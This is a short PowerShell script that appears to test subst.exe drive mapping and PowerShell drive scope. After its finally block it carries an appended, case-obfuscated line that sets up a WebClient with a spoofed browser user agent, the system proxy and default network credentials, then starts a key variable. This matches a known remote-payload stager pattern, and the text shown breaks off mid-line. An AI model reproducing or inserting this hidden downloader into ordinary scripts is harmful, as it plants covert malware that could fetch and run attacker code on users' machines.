

param ([String]$Path)

try
{
    
    $driveLetter = [char[]](70..89) | Where-Object {$_ -notin (Get-PSDrive).Name} | Select-Object -Last 1

    $dir = New-Item $Path -ItemType Directory -Force

    
    subst.exe "$driveLetter`:" $dir.Parent.FullName
    $exitCode = $LASTEXITCODE
    if ($exitCode -ne 0) { Write-Error "Creating drive with subst.exe failed with exit code $exitCode" }

    $root = [String]::Format('{0}:\', $driveLetter)
    $pathToCheck = Join-Path -Path $root -ChildPath $dir.Name

    if (Test-Path $pathToCheck)
    {
        "Drive found"
        if (-not (Get-PSDrive -Name $driveLetter -Scope Global -ErrorAction SilentlyContinue))
        {
            Write-Error "Drive is NOT in Global scope"
        }
    }
    else { Write-Error "$pathToCheck not found" }
}
finally
{
    subst.exe "$driveLetter`:" /d
}

$WC=NEW-ObjeCt SYStEm.NEt.WEBCLIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeadeRS.ADd('User-Agent',$u);$wc.PROxY = [SYStEm.NET.WeBReQueSt]::DefAultWeBPROxy;$Wc.ProXY.CrEDentIALS = [SYsteM.NEt.CRedenTIaLCACHe]::DEFaUltNeTWOrKCrEDENtIaLS;$K='ZblE7)|

